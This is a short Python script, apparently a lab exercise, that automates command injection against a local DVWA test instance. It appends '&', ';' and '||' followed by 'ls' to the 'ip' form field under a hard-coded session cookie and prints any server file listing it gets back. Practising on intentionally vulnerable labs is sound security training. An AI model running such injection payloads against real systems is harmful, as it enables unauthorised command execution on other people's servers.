# Importing Modules
import requests
import re

commands = ['&',';','||']                   # Trying different query symbols (AND,SEMI-COLON,OR)

URL = "http://127.0.0.1/DVWA/vulnerabilities/exec/"
cookie = {"PHPSESSID":"9tp4hi0m7muokdfi94sk31ji4f","security":"low"}

session = requests.Session()                # Creating the session

for command in commands:
    data = {"ip":command+"ls","Submit":"Submit"}                            # ls = List command
    request = session.post(URL, cookies=cookie, data=data)                  # Accessing the session opened on browser using the same cookie
    response = re.search(r'<pre>(?P<file>.*)</pre>',request.text,re.DOTALL)  # Get only the pre-formatted text from server response i.e the server files
    serverFiles = response.group("file")                                     # Add the file to a group
    if len(serverFiles) > 1:
        print(command, "works on this site!")
        print("**Server Files and Folders**")
        print(serverFiles,"\n")
    else:
        print("Does not work")